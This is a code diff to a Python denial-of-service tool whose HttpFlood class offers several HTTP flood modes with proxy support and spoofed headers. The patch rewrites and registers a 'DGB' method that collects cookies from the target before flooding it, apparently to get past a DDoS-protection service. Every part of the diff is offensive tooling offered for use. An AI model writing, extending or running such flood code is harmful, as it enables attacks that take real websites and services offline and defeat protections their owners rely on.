@@ -33,7 +33,7 @@ from dns import resolver
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
-from requests import Response, Session, exceptions, get
+from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
@@ -781,7 +781,11 @@ class HttpFlood(Thread):
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
         s = None
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), Session() as s:
+            with s.post(self._target.human_repr()) as ss:
+                ss.raise_for_status()
+                for key, value in ss.cookies.items():
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
             for _ in range(min(self._rpc, 5)):
                 sleep(min(self._rpc, 5) / 100)
                 if self._proxies:
@@ -798,7 +802,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def DYN(self):
-        payload: str | bytes = str.encode(self._payload +
+        payload: Any = str.encode(self._payload +
                                           "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
                                           self.randHeadercontent +
                                           "\r\n")
@@ -809,7 +813,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def DOWNLOADER(self):
-        payload: str | bytes = self.generate_payload()
+        payload: Any = self.generate_payload()
 
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -867,7 +871,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def NULL(self) -> None:
-        payload: str | bytes = str.encode(self._payload +
+        payload: Any = str.encode(self._payload +
                                           "Host: %s\r\n" % self._target.authority +
                                           "User-Agent: null\r\n" +
                                           "Referrer: null\r\n" +
@@ -923,6 +927,8 @@ class HttpFlood(Thread):
             self.SENT_FLOOD = self.APACHE
         if name == "BYPASS":
             self.SENT_FLOOD = self.BYPASS
+        if name == "DGB":
+            self.SENT_FLOOD = self.DGB
         if name == "OVH":
             self.SENT_FLOOD = self.OVH
         if name == "AVB":
